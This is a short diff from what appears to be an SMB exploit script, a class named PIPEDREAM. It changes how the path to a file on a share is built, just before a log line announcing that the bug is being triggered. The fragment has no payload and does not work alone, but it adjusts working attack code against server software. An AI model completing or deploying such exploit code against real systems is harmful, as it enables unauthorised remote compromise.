@@ -142,7 +142,7 @@ class PIPEDREAM:
         # to make things easier for the caller. Not this time ;)
         treeId = self.__smbClient.connectTree('IPC$')
         sharePath = sharePath.replace('\\', '/')
-        pathName = path.join(sharePath, fileName)
+        pathName = '/' + path.join(sharePath, fileName)
         logging.info('Final path to load is %s' % pathName)
         logging.info('Triggering bug now, cross your fingers')
 
